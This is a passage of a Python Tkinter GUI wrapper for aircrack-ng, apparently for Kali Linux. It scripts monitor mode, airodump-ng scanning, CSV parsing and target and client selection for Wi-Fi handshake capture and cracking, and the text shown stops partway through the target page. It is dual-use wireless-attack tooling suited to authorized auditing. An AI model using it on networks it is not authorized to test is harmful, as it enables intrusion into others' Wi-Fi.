#!/usr/bin/env python3
"""
wifiutil-gui.py — Aircrack-ng GUI Wrapper for Kali Linux

Flow: Interface → Monitor → Scan → Target → Capture → Crack

Usage: sudo python3 wifiutil-gui.py
"""

from __future__ import annotations

import os
import re
import shlex
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from tkinter import (
    BOTH,
    DISABLED,
    END,
    LEFT,
    NORMAL,
    RIGHT,
    WORD,
    X,
    Y,
    BooleanVar,
    Canvas,
    Entry,
    Frame,
    IntVar,
    Label,
    Listbox,
    Scrollbar,
    Spinbox,
    StringVar,
    Text,
    Tk,
    filedialog,
    messagebox,
    ttk,
)

CAPTURE_DIR = Path("/tmp/wifiutil-captures")
SCAN_DIR = Path("/tmp/wifiutil-scans")
BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

STEPS = [
    ("interface", "1. Interface"),
    ("monitor", "2. Monitor"),
    ("scan", "3. Scan"),
    ("target", "4. Target"),
    ("capture", "5. Capture"),
    ("crack", "6. Crack"),
]

# Dark theme colors (matches the Kali wrapper look)
C = {
    "bg": "#1a1d23",
    "panel": "#22262e",
    "sidebar": "#16191f",
    "card": "#2a2f3a",
    "border": "#3a4150",
    "text": "#e8eaed",
    "muted": "#9aa0a6",
    "accent": "#3b82f6",
    "accent_hover": "#2563eb",
    "danger": "#dc2626",
    "ok": "#22c55e",
    "warn": "#ef4444",
    "step_active": "#2563eb",
    "step_idle": "#2a2f3a",
}


# ---------- system helpers ----------

def run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True)


def which(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def list_wireless_ifaces() -> list[str]:
    out = run(["iw", "dev"]).stdout
    return [line.split()[1] for line in out.splitlines() if line.strip().startswith("Interface")]


def iface_is_monitor(iface: str) -> bool:
    return "type monitor" in run(["iw", "dev", iface, "info"]).stdout


def kill_interfering() -> None:
    run(["airmon-ng", "check", "kill"])
    time.sleep(0.5)


def unblock_radio() -> None:
    run(["rfkill", "unblock", "wifi"])
    run(["rfkill", "unblock", "all"])
    time.sleep(0.2)


def _iface_cycle(iface: str) -> None:
    """Down/up cycle — fixes 'device not initialized' on many USB adapters."""
    run(["ip", "link", "set", iface, "down"])
    time.sleep(0.6)
    run(["ip", "link", "set", iface, "up"])
    time.sleep(1.0)


def enable_monitor(iface: str) -> str:
    """
    Put adapter into monitor mode. Returns the interface name to use with airodump
    (may be wlan0mon if airmon-ng created it).
    """
    kill_interfering()
    unblock_radio()

    before = set(list_wireless_ifaces())

    # Prefer airmon-ng start — initializes firmware better on many chipsets
    run(["airmon-ng", "start", iface])
    time.sleep(1.5)
    after = set(list_wireless_ifaces())

    candidates = sorted(after - before) + sorted(after)
    seen: set[str] = set()
    for cand in candidates:
        if cand in seen:
            continue
        seen.add(cand)
        if iface_is_monitor(cand):
            _iface_cycle(cand)
            run(["iw", "dev", cand, "set", "channel", "1"])
            time.sleep(0.4)
            return cand

    # Fallback: iw set type monitor on original iface
    run(["ip", "link", "set", iface, "down"])
    time.sleep(0.4)
    r = run(["iw", "dev", iface, "set", "type", "monitor"])
    if r.returncode != 0:
        r2 = run(["iwconfig", iface, "mode", "monitor"])
        if r2.returncode != 0:
            raise RuntimeError(
                (r.stderr or r2.stderr or "").strip()
                or f"Failed to set {iface} to monitor mode"
            )
    run(["ip", "link", "set", iface, "up"])
    time.sleep(0.8)
    # Second cycle — common fix when airodump hops but sees 0 APs
    _iface_cycle(iface)
    if not iface_is_monitor(iface):
        raise RuntimeError(f"Failed to switch {iface} into monitor mode")
    run(["iw", "dev", iface, "set", "channel", "1"])
    time.sleep(0.4)
    return iface


def reinit_monitor(iface: str) -> None:
    """Re-init monitor iface when airodump shows empty (device not initialized)."""
    unblock_radio()
    kill_interfering()
    _iface_cycle(iface)
    if not iface_is_monitor(iface):
        run(["ip", "link", "set", iface, "down"])
        time.sleep(0.3)
        run(["iw", "dev", iface, "set", "type", "monitor"])
        run(["ip", "link", "set", iface, "up"])
        time.sleep(0.8)
        _iface_cycle(iface)
    run(["iw", "dev", iface, "set", "freq", "2412"])  # ch 1
    # freq may fail on some; try channel
    run(["iw", "dev", iface, "set", "channel", "1"])
    time.sleep(0.5)


def restore_managed(iface: str, base_iface: str | None = None) -> None:
    """Restore managed mode. Handles wlan0mon from airmon-ng."""
    base = base_iface or iface
    if iface.endswith("mon") or "mon" in iface:
        run(["airmon-ng", "stop", iface])
        time.sleep(0.8)
    run(["ip", "link", "set", iface, "down"])
    run(["iw", "dev", iface, "set", "type", "managed"])
    run(["ip", "link", "set", iface, "up"])
    # Also try restoring the original name
    if base != iface:
        run(["ip", "link", "set", base, "down"])
        run(["iw", "dev", base, "set", "type", "managed"])
        run(["ip", "link", "set", base, "up"])
    run(["systemctl", "restart", "NetworkManager"])
    time.sleep(0.5)


def safe_name(essid: str) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9._-]+", "_", essid).strip("_")
    if not cleaned or cleaned.lower() in {"hidden", "length"} or cleaned.startswith("length"):
        return "AP"
    return cleaned


def parse_airodump_csv(csv_path: Path) -> list[dict]:
    networks: list[dict] = []
    # Prefer the normal airodump CSV; skip kismet csv if someone passes it
    text = csv_path.read_text(errors="replace")
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("Station MAC"):
            break
        if line.startswith("BSSID"):
            continue
        # Normal AP row starts with a MAC address
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not BSSID_RE.match(bssid):
            continue
        essid = ",".join(parts[13:]).strip() or "<hidden>"
        if re.fullmatch(r"<length:\s*\d+>", essid):
            essid = "<hidden>"
        networks.append(
            {"bssid": bssid, "ch": parts[3], "pwr": parts[8], "enc": parts[5], "essid": essid}
        )

    def key(n: dict) -> int:
        try:
            return int(n["pwr"])
        except ValueError:
            return -999

    networks.sort(key=key, reverse=True)
    return networks


def parse_clients_csv(csv_path: Path, filter_bssid: str | None = None) -> list[dict]:
    clients: list[dict] = []
    text = csv_path.read_text(errors="replace")
    in_stations = False
    for raw in text.splitlines():
        line = raw.strip()
        if line.startswith("Station MAC"):
            in_stations = True
            continue
        if not in_stations or not line:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 6:
            continue
        station = parts[0]
        if not BSSID_RE.match(station):
            continue
        bssid = parts[5]
        if filter_bssid:
            if bssid.upper() != filter_bssid.upper():
                continue
        elif bssid == "(not associated)":
            continue
        clients.append(
            {
                "station": station,
                "pwr": parts[3],
                "packets": parts[4],
                "bssid": bssid,
                "probes": ",".join(parts[6:]).strip() or "-",
            }
        )

    def key(c: dict) -> int:
        try:
            return int(c["pwr"])
        except ValueError:
            return -999

    clients.sort(key=key, reverse=True)
    return clients


def find_terminal() -> tuple[str, list[str]] | None:
    checks = [
        ("shell-string", ["qterminal", "-e"]),
        ("shell-string", ["xfce4-terminal", "-e"]),
        ("argv", ["gnome-terminal", "--"]),
        ("shell-string", ["x-terminal-emulator", "-e"]),
        ("shell-string", ["xterm", "-hold", "-e"]),
    ]
    for kind, argv in checks:
        if shutil.which(argv[0]):
            return kind, argv
    return None


def run_airodump_timed(cmd: list[str], duration: int, log_cb=None) -> tuple[int, str]:
    """
    Run airodump-ng for `duration` seconds, then force-stop it.
    airodump often ignores SIGTERM from GNU timeout and hangs forever —
    so we manage the process group ourselves and escalate to SIGKILL.
    """
    err_file = SCAN_DIR / f"airodump-err-{os.getpid()}.log"
    SCAN_DIR.mkdir(parents=True, exist_ok=True)
    stderr_f = open(err_file, "w", encoding="utf-8", errors="replace")
    # Drop ncurses UI; keep stderr for diagnostics
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=stderr_f,
        stdin=subprocess.DEVNULL,
        start_new_session=True,
    )
    if log_cb:
        log_cb(f"PID {proc.pid}: {' '.join(cmd)}")

    try:
        proc.wait(timeout=max(1, duration) + 1)
    except subprocess.TimeoutExpired:
        if log_cb:
            log_cb(f"Stopping airodump (pid {proc.pid})…")
        try:
            os.killpg(proc.pid, 15)  # SIGTERM process group
        except ProcessLookupError:
            pass
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(proc.pid, 9)  # SIGKILL
            except ProcessLookupError:
                pass
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
    finally:
        stderr_f.close()

    err_text = ""
    try:
        err_text = err_file.read_text(errors="replace").strip()
    except OSError:
        pass
    try:
        err_file.unlink(missing_ok=True)
    except OSError:
        pass
    return proc.returncode or 0, err_text


def open_in_terminal(cmd: list[str]) -> subprocess.Popen:
    term = find_terminal()
    if term is None:
        return subprocess.Popen(cmd)
    kind, prefix = term
    inner = (
        " ".join(shlex.quote(c) for c in cmd)
        + "; echo; echo 'Done. Press Enter to close.'; read"
    )
    if kind == "argv":
        full = prefix + ["bash", "-lc", inner]
    else:
        full = prefix + [f"bash -lc {shlex.quote(inner)}"]
    return subprocess.Popen(full)


# ---------- GUI ----------

class App:
    def __init__(self, root: Tk) -> None:
        self.root = root
        self.root.title("Aircrack-ng GUI Wrapper")
        self.root.minsize(960, 640)
        self.root.geometry("1100x720")
        self.root.configure(bg=C["bg"])

        SCAN_DIR.mkdir(parents=True, exist_ok=True)
        CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

        self.step = "interface"
        self.iface = StringVar(value="")
        self.mon_iface = StringVar(value="")  # actual monitor iface (may be wlan0mon)
        self.monitor_on = BooleanVar(value=False)
        self.scan_duration = IntVar(value=20)
        self.client_duration = IntVar(value=20)
        self.deauth_count = IntVar(value=0)
        self.capture_name = StringVar(value="Capture-AP")
        self.cap_path = StringVar(value="")
        self.wordlist = StringVar(value="")
        self.step_label = StringVar(value="Step: Interface")
        self.root_status = StringVar(value="")
        self.tools_status = StringVar(value="")

        self.networks: list[dict] = []
        self.clients: list[dict] = []
        self.selected_ap: dict | None = None
        self.selected_client: dict | None = None
        self.last_csv: Path | None = None

        self.busy = False
        self.procs: list[subprocess.Popen] = []
        self.scan_prefix: Path | None = None
        self.clients_prefix: Path | None = None
        self.step_buttons: dict[str, Label] = {}
        self.pages: dict[str, Frame] = {}

        self._style()
        self._build()
        self._check_env()
        self.show_step("interface")
        self.refresh_ifaces()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    # ----- chrome -----

    def _style(self) -> None:
        style = ttk.Style()
        try:
            style.theme_use("clam")
        except Exception:
            pass
        style.configure(
            "Treeview",
            background=C["card"],
            foreground=C["text"],
            fieldbackground=C["card"],
            borderwidth=0,
            rowheight=26,
        )
        style.configure(
            "Treeview.Heading",
            background=C["panel"],
            foreground=C["text"],
            relief="flat",
        )
        style.map("Treeview", background=[("selected", C["accent"])])

    def _build(self) -> None:
        # Header
        header = Frame(self.root, bg=C["bg"], padx=16, pady=10)
        header.pack(fill=X)
        Label(
            header,
            text="Aircrack-ng GUI Wrapper",
            bg=C["bg"],
            fg=C["text"],
            font=("Segoe UI", 14, "bold"),
        ).pack(anchor="w")
        status_row = Frame(header, bg=C["bg"])
        status_row.pack(fill=X, pady=(4, 0))
        Label(status_row, textvariable=self.root_status, bg=C["bg"], fg=C["ok"], font=("Segoe UI", 9)).pack(
            side=LEFT, padx=(0, 16)
        )
        Label(
            status_row, textvariable=self.tools_status, bg=C["bg"], fg=C["ok"], font=("Segoe UI", 9)
        ).pack(side=LEFT)

        body = Frame(self.root, bg=C["bg"])
        body.pack(fill=BOTH, expand=True, padx=12, pady=(0, 8))

        # Sidebar
        side = Frame(body, bg=C["sidebar"], width=180)
        side.pack(side=LEFT, fill=Y, padx=(0, 12))
        side.pack_propagate(False)
        Label(
            side, text="Steps", bg=C["sidebar"], fg=C["muted"], font=("Segoe UI", 9), padx=12, pady=10
        ).pack(anchor="w")

        for key, title in STEPS:
            btn = Label(
                side,
                text=title,
                bg=C["step_idle"],
                fg=C["text"],
                font=("Segoe UI", 10),
                padx=14,
                pady=10,
                anchor="w",
                cursor="hand2",
            )
            btn.pack(fill=X, padx=10, pady=3)
            btn.bind("<Button-1>", lambda _e, k=key: self.show_step(k))
            self.step_buttons[key] = btn

        Frame(side, bg=C["sidebar"]).pack(fill=BOTH, expand=True)
        stop = Label(
            side,
            text="Stop all",
            bg=C["danger"],
            fg="white",
            font=("Segoe UI", 10, "bold"),
            padx=14,
            pady=10,
            cursor="hand2",
        )
        stop.pack(fill=X, padx=10, pady=12)
        stop.bind("<Button-1>", lambda _e: self.stop_all())

        # Main column
        main = Frame(body, bg=C["panel"])
        main.pack(side=LEFT, fill=BOTH, expand=True)

        self.content = Frame(main, bg=C["panel"], padx=16, pady=12)
        self.content.pack(fill=BOTH, expand=True)

        for key, _ in STEPS:
            page = Frame(self.content, bg=C["panel"])
            self.pages[key] = page

        self._build_interface()
        self._build_monitor()
        self._build_scan()
        self._build_target()
        self._build_capture()
        self._build_crack()

        # Log
        log_wrap = Frame(main, bg=C["panel"], padx=16, pady=10)
        log_wrap.pack(fill=X, pady=(0, 0))
        log_head = Frame(log_wrap, bg=C["panel"])
        log_head.pack(fill=X)
        Label(log_head, text="Log", bg=C["panel"], fg=C["text"], font=("Segoe UI", 10, "bold")).pack(
            side=LEFT
        )
        clear = Label(
            log_head, text="Clear", bg=C["card"], fg=C["text"], padx=10, pady=2, cursor="hand2"
        )
        clear.pack(side=RIGHT)
        clear.bind("<Button-1>", lambda _e: self.clear_log())

        self.log = Text(
            log_wrap,
            height=7,
            bg="#0f1115",
            fg=C["text"],
            insertbackground=C["text"],
            relief="flat",
            wrap=WORD,
            font=("Consolas", 9),
        )
        self.log.pack(fill=X, pady=(6, 0))
        self.log.insert(
            END,
            "AUTHORIZED USE ONLY — Test only networks you own or have written permission to audit. "
            "Unauthorized access is illegal.\n",
        )
        self.log.configure(state=DISABLED)

        # Footer
        foot = Frame(self.root, bg=C["bg"], padx=16, pady=6)
        foot.pack(fill=X)
        Label(foot, textvariable=self.step_label, bg=C["bg"], fg=C["muted"], font=("Segoe UI", 9)).pack(
            side=LEFT
        )

    def _btn(self, parent, text: str, command, danger: bool = False) -> Label:
        bg = C["danger"] if danger else C["accent"]
        lbl = Label(
            parent,
            text=text,
            bg=bg,
            fg="white",
            font=("Segoe UI", 10, "bold"),
            padx=14,
            pady=8,
            cursor="hand2",
        )
        lbl.bind("<Button-1>", lambda _e: command())
        return lbl

    def _check_env(self) -> None:
        if os.geteuid() == 0:
            self.root_status.set("Running as root — monitor mode available")
        else:
            self.root_status.set("NOT root — re-run with sudo")
        needed = [
            "iw",
            "airmon-ng",
            "airodump-ng",
            "aireplay-ng",
            "aircrack-ng",
            "ip",
            "rfkill",
        ]
        missing = [b for b in needed if not which(b)]
        if missing:
            self.tools_status.set("Missing: " + ", ".join(missing))
        else:
            self.tools_status.set("aircrack-ng tools found on PATH")

    def log_msg(self, msg: str) -> None:
        self.log.configure(state=NORMAL)
        self.log.insert(END, msg.rstrip() + "\n")
        self.log.see(END)
        self.log.configure(state=DISABLED)

    def clear_log(self) -> None:
        self.log.configure(state=NORMAL)
        self.log.delete("1.0", END)
        self.log.configure(state=DISABLED)

    def show_step(self, key: str) -> None:
        self.step = key
        for k, page in self.pages.items():
            page.pack_forget()
        self.pages[key].pack(fill=BOTH, expand=True)
        for k, btn in self.step_buttons.items():
            btn.configure(bg=C["step_active"] if k == key else C["step_idle"])
        title = dict(STEPS)[key].split(". ", 1)[-1]
        self.step_label.set(f"Step: {title}")

    def next_step(self, key: str) -> None:
        self.show_step(key)

    # ----- Step 1: Interface -----

    def _build_interface(self) -> None:
        p = self.pages["interface"]
        Label(
            p, text="Wireless Interface", bg=C["panel"], fg=C["text"], font=("Segoe UI", 16, "bold")
        ).pack(anchor="w")
        Label(
            p,
            text="Select the Wi-Fi adapter that supports monitor mode and injection.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 10),
        ).pack(anchor="w", pady=(4, 12))

        row = Frame(p, bg=C["panel"])
        row.pack(fill=X)
        self._btn(row, "Refresh", self.refresh_ifaces).pack(side=LEFT)
        self.iface_count = StringVar(value="0 Interface(s)")
        Label(row, textvariable=self.iface_count, bg=C["panel"], fg=C["muted"]).pack(
            side=LEFT, padx=12
        )

        box = Frame(p, bg=C["card"], padx=8, pady=8)
        box.pack(fill=BOTH, expand=True, pady=12)
        self.iface_list = Listbox(
            box,
            bg=C["card"],
            fg=C["text"],
            selectbackground=C["accent"],
            relief="flat",
            font=("Consolas", 11),
            activestyle="none",
        )
        self.iface_list.pack(fill=BOTH, expand=True)

        nav = Frame(p, bg=C["panel"])
        nav.pack(fill=X, pady=(8, 0))
        self._btn(nav, "Use selected →", self.use_interface).pack(side=RIGHT)

    def refresh_ifaces(self) -> None:
        ifaces = list_wireless_ifaces()
        self.iface_list.delete(0, END)
        for i in ifaces:
            self.iface_list.insert(END, i)
        self.iface_count.set(f"{len(ifaces)} Interface(s)")
        if ifaces:
            self.iface_list.selection_set(0)
        self.log_msg(f"Found interfaces: {', '.join(ifaces) or '(none)'}")

    def use_interface(self) -> None:
        sel = self.iface_list.curselection()
        if not sel:
            messagebox.showinfo("Select interface", "Select a wireless interface first.")
            return
        iface = self.iface_list.get(sel[0])
        self.iface.set(iface)
        self.log_msg(f"Selected interface: {iface}")
        self.next_step("monitor")

    # ----- Step 2: Monitor -----

    def _build_monitor(self) -> None:
        p = self.pages["monitor"]
        Label(p, text="Monitor Mode", bg=C["panel"], fg=C["text"], font=("Segoe UI", 16, "bold")).pack(
            anchor="w"
        )
        Label(
            p,
            text="Put the adapter into monitor mode. NetworkManager will be stopped while scanning.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 10),
        ).pack(anchor="w", pady=(4, 12))

        self.monitor_status = StringVar(value="Monitor mode: off")
        Label(
            p, textvariable=self.monitor_status, bg=C["panel"], fg=C["text"], font=("Consolas", 11)
        ).pack(anchor="w", pady=8)

        row = Frame(p, bg=C["panel"])
        row.pack(fill=X, pady=8)
        self._btn(row, "Enable monitor mode", self.enable_monitor_step).pack(side=LEFT, padx=(0, 8))
        self._btn(row, "Reinit adapter", self.reinit_monitor_step).pack(side=LEFT, padx=(0, 8))
        self._btn(row, "Restore managed mode", self.restore_monitor_step, danger=True).pack(side=LEFT)

        Label(
            p,
            text="airmon-ng start (preferred) → down/up reinit → set channel 1\n"
            "If airodump hops but shows 0 APs, click Reinit adapter then scan again.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Consolas", 9),
            justify="left",
        ).pack(anchor="w", pady=(16, 0))

        nav = Frame(p, bg=C["panel"])
        nav.pack(fill=X, side="bottom", pady=(8, 0))
        self._btn(nav, "← Back", lambda: self.show_step("interface")).pack(side=LEFT)
        self._btn(nav, "Continue to Scan →", lambda: self.next_step("scan")).pack(side=RIGHT)

    def mon(self) -> str:
        """Interface name to pass to airodump (monitor iface)."""
        return self.mon_iface.get().strip() or self.iface.get().strip()

    def enable_monitor_step(self) -> None:
        iface = self.iface.get()
        if not iface:
            messagebox.showinfo("No interface", "Go back and select an interface.")
            return
        if os.geteuid() != 0:
            messagebox.showerror("Root required", "Run with sudo.")
            return
        try:
            self.log_msg("Stopping interfering processes + enabling monitor (airmon-ng/iw)…")
            mon = enable_monitor(iface)
            self.mon_iface.set(mon)
            self.monitor_on.set(True)
            extra = f"  [from {iface}]" if mon != iface else ""
            self.monitor_status.set(f"Monitor mode: ON  ({mon}){extra}")
            self.log_msg(f"Monitor ready on {mon}. Wait ~2s, then go to Scan (use 20s+).")
            self.refresh_ifaces()
            # If airmon created wlan0mon, select it as the active scan iface
            if mon != iface:
                self.log_msg(f"NOTE: use {mon} for airodump (not {iface})")
            time.sleep(2.0)
        except Exception as exc:
            self.log_msg(f"ERROR: {exc}")
            messagebox.showerror("Monitor mode failed", str(exc))

    def reinit_monitor_step(self) -> None:
        iface = self.mon()
        if not iface:
            messagebox.showinfo("No interface", "Enable monitor mode first.")
            return
        try:
            self.log_msg(f"Reinitializing {iface} (down/up + channel 1)…")
            reinit_monitor(iface)
            self.monitor_on.set(True)
            self.monitor_status.set(f"Monitor mode: ON  ({iface})  [reinitialized]")
            self.log_msg(f"Reinit done on {iface} — try Start scan again.")
        except Exception as exc:
            self.log_msg(f"ERROR: {exc}")
            messagebox.showerror("Reinit failed", str(exc))

    def restore_monitor_step(self) -> None:
        iface = self.mon()
        base = self.iface.get()
        if not iface:
            return
        try:
            restore_managed(iface, base_iface=base)
            self.monitor_on.set(False)
            self.mon_iface.set("")
            self.monitor_status.set(f"Monitor mode: off  ({base or iface} managed)")
            self.log_msg("Restored managed mode")
            self.refresh_ifaces()
        except Exception as exc:
            self.log_msg(f"ERROR: {exc}")

    # ----- Step 3: Scan -----

    def _build_scan(self) -> None:
        p = self.pages["scan"]
        Label(
            p, text="Scan Networks", bg=C["panel"], fg=C["text"], font=("Segoe UI", 16, "bold")
        ).pack(anchor="w")
        Label(
            p,
            text="Runs live airodump-ng (same as: sudo airodump-ng wlan0) and saves results.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 10),
        ).pack(anchor="w", pady=(4, 12))

        row = Frame(p, bg=C["panel"])
        row.pack(fill=X)
        Label(row, text="Duration (s):", bg=C["panel"], fg=C["text"]).pack(side=LEFT)
        Spinbox(row, from_=5, to=120, textvariable=self.scan_duration, width=5).pack(
            side=LEFT, padx=8
        )
        self._btn(row, "Start scan", self.start_scan).pack(side=LEFT, padx=8)
        self._btn(row, "Stop & load results", self.stop_scan_load, danger=True).pack(side=LEFT, padx=4)

        wrap = Frame(p, bg=C["panel"])
        wrap.pack(fill=BOTH, expand=True, pady=10)
        cols = ("#", "bssid", "ch", "pwr", "enc", "essid")
        self.scan_tree = ttk.Treeview(wrap, columns=cols, show="headings", selectmode="browse")
        widths = {"#": 40, "bssid": 160, "ch": 50, "pwr": 60, "enc": 90, "essid": 260}
        for c in cols:
            self.scan_tree.heading(c, text=c.upper() if c != "#" else "#")
            self.scan_tree.column(c, width=widths[c], anchor="w")
        sb = Scrollbar(wrap, command=self.scan_tree.yview)
        self.scan_tree.configure(yscrollcommand=sb.set)
        self.scan_tree.pack(side=LEFT, fill=BOTH, expand=True)
        sb.pack(side=RIGHT, fill=Y)

        nav = Frame(p, bg=C["panel"])
        nav.pack(fill=X)
        self._btn(nav, "← Back", lambda: self.show_step("monitor")).pack(side=LEFT)
        self._btn(nav, "Use selection as Target →", self.scan_to_target).pack(side=RIGHT)

    def start_scan(self) -> None:
        iface = self.mon()
        if not iface:
            messagebox.showinfo("No interface", "Select an interface and enable monitor first.")
            return
        if self.busy:
            self.log_msg("Scan already running — use Stop & load results, or Stop all.")
            return
        try:
            duration = int(self.scan_duration.get())
        except (TypeError, ValueError):
            messagebox.showerror("Invalid duration", "Duration must be a number.")
            return
        if duration < 3:
            messagebox.showerror("Duration too short", "Use at least 3 seconds (15+ recommended).")
            return
        self.busy = True
        self.log_msg(f"Starting live scan on {iface} for {duration}s (airodump-ng)…")
        threading.Thread(target=self._scan_worker, args=(iface, duration), daemon=True).start()

    def stop_scan_load(self) -> None:
        """Stop airodump early and load whatever CSV was written."""
        self.log_msg("Stopping scan and loading CSV…")
        run(["pkill", "-INT", "-f", "airodump-ng"])
        time.sleep(0.5)
        run(["pkill", "-9", "-f", "airodump-ng"])
        if self.scan_prefix:
            csv_path = Path(f"{self.scan_prefix}-01.csv")
            if csv_path.is_file():
                self._apply_scan_csv(csv_path)
                self.busy = False
                return
        # fallback: newest scan csv
        files = sorted(SCAN_DIR.glob("scan-*-01.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
        if files:
            self._apply_scan_csv(files[0])
        else:
            self.log_msg("No scan CSV found yet.")
        self.busy = False

    def _apply_scan_csv(self, csv_path: Path) -> None:
        self.last_csv = csv_path
        # Log a short preview so we can debug empty parses
        try:
            preview = csv_path.read_text(errors="replace")[:400].replace("\n", " | ")
            self.log_msg(f"CSV preview: {preview}")
        except OSError:
            pass
        self.networks = parse_airodump_csv(csv_path)
        self.scan_tree.delete(*self.scan_tree.get_children())
        for i, n in enumerate(self.networks, start=1):
            self.scan_tree.insert(
                "",
                END,
                iid=str(i - 1),
                values=(i, n["bssid"], n["ch"], n["pwr"], n["enc"], n["essid"]),
            )
        self.log_msg(f"Scan complete — {len(self.networks)} AP(s)  ({csv_path.name})")

    def _scan_worker(self, iface: str, duration: int) -> None:
        err = None
        csv_path = None
        try:
            base = self.iface.get() or iface
            if not iface_is_monitor(iface):
                self.root.after(0, lambda: self.log_msg("Enabling monitor mode for scan…"))
                mon = enable_monitor(base)
                iface = mon
                self.root.after(0, lambda m=mon: self.mon_iface.set(m))
                self.root.after(0, lambda: self.monitor_on.set(True))
                time.sleep(2.5)  # let firmware finish init
            else:
                # Do NOT down/up reinit here — that often leaves the card
                # uninitialized and airodump shows 0 APs. Only settle briefly.
                unblock_radio()
                time.sleep(1.0)

            # Prefer a *mon iface if airmon-ng created one
            for cand in list_wireless_ifaces():
                if cand.endswith("mon") and iface_is_monitor(cand):
                    iface = cand
                    self.root.after(0, lambda m=cand: self.mon_iface.set(m))
                    break

            info = run(["iw", "dev", iface, "info"]).stdout
            self.root.after(
                0, lambda: self.log_msg(f"Interface: {iface}  monitor={('type monitor' in info)}")
            )
            time.sleep(0.5)

            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            prefix = SCAN_DIR / f"scan-{ts}"
            self.scan_prefix = prefix

            cmd = [
                "airodump-ng",
                "--band",
                "abg",
                "-w",
                str(prefix),
                "--write-interval",
                "1",
                iface,
            ]
            self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))

            if find_terminal() is not None:
                proc = open_in_terminal(cmd)
                self.procs.append(proc)
                self.root.after(
                    0,
                    lambda: self.log_msg(
                        f"Live airodump window opened for {duration}s — watch networks there.\n"
                        "If still empty after a few seconds: Stop all → Monitor → Reinit → Scan."
                    ),
                )
                time.sleep(duration)
                self.root.after(0, lambda: self.log_msg("Stopping airodump…"))
                run(["pkill", "-INT", "-f", "airodump-ng"])
                time.sleep(1)
                run(["pkill", "-9", "-f", "airodump-ng"])
                time.sleep(0.5)
            else:
                def log_from_thread(msg: str) -> None:
                    self.root.after(0, lambda m=msg: self.log_msg(m))

                run_airodump_timed(cmd, duration, log_cb=log_from_thread)

            csv_path = Path(f"{prefix}-01.csv")
            if not csv_path.is_file():
                alts = [
                    p
                    for p in sorted(SCAN_DIR.glob(f"scan-{ts}*"))
                    if p.suffix == ".csv" and "kismet" not in p.name
                ]
                if alts:
                    csv_path = alts[0]
            if not csv_path.is_file():
                raise RuntimeError(
                    "No scan CSV produced.\n"
                    f"Try: Monitor → Reinit adapter, then scan again.\n"
                    f"Manual: sudo airodump-ng {iface}"
                )
        except Exception as exc:
            err = str(exc)

        def finish() -> None:
            self.busy = False
            if err:
                self.log_msg(f"Scan failed: {err}")
                messagebox.showerror("Scan failed", err)
                return
            assert csv_path is not None
            self._apply_scan_csv(csv_path)
            if not self.networks:
                messagebox.showinfo(
                    "No APs found",
                    "airodump finished but saw 0 APs (often 'device not initialized').\n\n"
                    "1) Stop all\n"
                    "2) Monitor → Reinit adapter\n"
                    "3) Scan again (15–30s)\n\n"
                    f"Manual test: sudo airodump-ng {self.mon()}",
                )

        self.root.after(0, finish)

    def scan_to_target(self) -> None:
        sel = self.scan_tree.selection()
        if sel:
            idx = int(sel[0])
            self.selected_ap = self.networks[idx]
            self.capture_name.set(f"Capture-{safe_name(self.selected_ap['essid'])}")
            self._refresh_target_labels()
            self.log_msg(
                f"Target AP: {self.selected_ap['essid']}  {self.selected_ap['bssid']}  "
                f"ch={self.selected_ap['ch']}"
            )
        self._fill_target_ap_table()
        self.next_step("target")

    # ----- Step 4: Target -----

    def _build_target(self) -> None:
        p = self.pages["target"]
        Label(p, text="Select Target", bg=C["panel"], fg=C["text"], font=("Segoe UI", 16, "bold")).pack(
            anchor="w"
        )
        Label(
            p,
            text="Pick the AP (BSSID + channel), then discover and select a connected client.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 10),
        ).pack(anchor="w", pady=(4, 8))

        self.target_ap_var = StringVar(value="AP: (none)")
        self.target_client_var = StringVar(value="Client: (none)")
        Label(p, textvariable=self.target_ap_var, bg=C["panel"], fg=C["text"], font=("Consolas", 10)).pack(
            anchor="w"
        )
        Label(
            p, textvariable=self.target_client_var, bg=C["panel"], fg=C["text"], font=("Consolas", 10)
        ).pack(anchor="w", pady=(0, 8))

        Label(p, text="Access points", bg=C["panel"], fg=C["muted"]).pack(anchor="w")
        wrap = Frame(p, bg=C["panel"])
        wrap.pack(fill=BOTH, expand=True)
        cols = ("#", "bssid", "ch", "pwr", "enc", "essid")
        self.target_ap_tree = ttk.Treeview(wrap, columns=cols, show="headings", selectmode="browse", height=6)
        for c in cols:
            self.target_ap_tree.heading(c, text=c.upper() if c != "#" else "#")
            self.target_ap_tree.column(c, width=80 if c != "essid" else 200, anchor="w")
        self.target_ap_tree.column("bssid", width=150)
        self.target_ap_tree.pack(side=LEFT, fill=BOTH, expand=True)
        self.target_ap_tree.bind("<<TreeviewSelect>>", self.on_pick_ap)

        row = Frame(p, bg=C["panel"])
        row.pack(fill=X, pady=8)
        Label(row, text="Client scan (s):", bg=C["panel"], fg=C["text"]).pack(side=LEFT)
        Spinbox(row, from_=5, to=120, textvariable=self.client_duration, width=5).pack(side=LEFT, padx=8)
        self._btn(row, "Find clients on AP", self.find_clients).pack(side=LEFT, padx=(0, 6))
        self._btn(row, "Stop & load", self.stop_clients_load, danger=True).pack(side=LEFT, padx=(0, 6))
